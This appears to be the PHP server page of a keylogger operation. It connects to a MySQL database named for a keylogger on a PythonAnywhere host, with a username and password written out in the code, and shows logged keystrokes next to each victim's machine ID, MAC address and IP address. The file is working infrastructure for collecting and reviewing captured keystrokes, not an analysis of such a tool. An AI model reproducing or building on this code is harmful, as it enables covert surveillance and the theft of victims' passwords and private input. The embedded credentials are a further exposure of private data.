<?php
// Configuration de la base de données
$host = 'kapelo.mysql.pythonanywhere-services.com'; // Remplacez par votre hôte
$db = 'kapelo$keylogger'; // Remplacez par votre nom de base de données
$user = 'kapelo'; // Remplacez par votre nom d'utilisateur
$pass = 'Babana36'; // Remplacez par votre mot de passe

// Connexion à la base de données
try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Erreur de connexion : " . $e->getMessage());
}

// Récupérer les données
$query = "SELECT * FROM keystrokes ORDER BY timestamp DESC";
$stmt = $pdo->prepare($query);
$stmt->execute();
$keystrokes = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Données du Keylogger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <h1>Données du Keylogger</h1>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Machine ID</th>
                <th>Adresse MAC</th>
                <th>Adresse IP</th>
                <th>Keystrokes</th>
                <th>Timestamp</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($keystrokes as $row): ?>
                <tr>
                    <td><?php echo htmlspecialchars($row['id']); ?></td>
                    <td><?php echo htmlspecialchars($row['machine_id']); ?></td>
                    <td><?php echo htmlspecialchars($row['mac_address']); ?></td>
                    <td><?php echo htmlspecialchars($row['ip_address']); ?></td>
                    <td><?php echo htmlspecialchars($row['keystrokes']); ?></td>
                    <td><?php echo htmlspecialchars($row['timestamp']); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>